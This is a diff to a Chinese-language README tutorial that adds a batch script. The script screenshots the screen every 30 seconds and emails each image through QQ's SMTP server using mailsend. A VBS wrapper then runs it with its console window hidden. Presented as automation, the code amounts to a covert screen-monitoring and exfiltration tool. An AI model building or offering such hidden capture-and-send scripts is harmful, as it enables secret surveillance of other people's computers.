@@ -41,5 +41,43 @@ mailsend -to <dest_mail_address> -from <src_mail_address> -ssl -port 465 -auth-l
 使用 `bin` 目录下的 `nircmd` 来实现等待一段时间：
 
 ```batch
-nircmd wait 60000
+nircmd wait 30000
 ```
+
+### 开始我的自动化脚本
+
+1. 创建一个记事本文件，命名为"scripts.bat"然后打开vscode把文件拖进去开始编辑文件
+2. 写入如下代码：
+```batch
+@echo off
+
+PATH %CD%\bin
+
+:loop
+
+nircmd savescreenshot screen.png
+
+mailsend -to 邮箱地址 -from 邮箱地址 -ssl -port 465 -auth-login -smtp smtp.qq.com -sub "所发的邮件名字" -user 193319076 -pass "密码" -attach screen.png
+
+nircmd wait 30000
+
+del screen.png
+
+goto loop
+```
+3. 点击运行，就可以收到邮件了
+   ![预览](.\img\1.png)
+   点开就是截图
+   ![截图](.\img\2.png)
+---
+---
+4. 然后隐藏黑框的方法：
+   scripts.bat同目录下新建一个记事本并写入如下代码
+```batch
+Dim Wsh
+Set Wsh = WScript.CreateObject("WScript.Shell")
+WScript.Sleep(0000)
+Wsh.Run "scripts.bat",0,True
+```
+然后把文件后缀给成vbs
+就可以实现隐藏黑框了
